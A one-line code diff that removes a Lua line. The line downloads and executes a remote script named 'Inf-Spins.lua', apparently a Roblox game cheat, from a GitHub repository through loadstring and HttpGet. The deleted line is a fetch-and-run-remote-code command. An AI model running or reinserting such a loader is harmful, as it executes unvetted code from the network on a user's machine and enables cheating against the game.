@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Inf-Spins.lua"))()
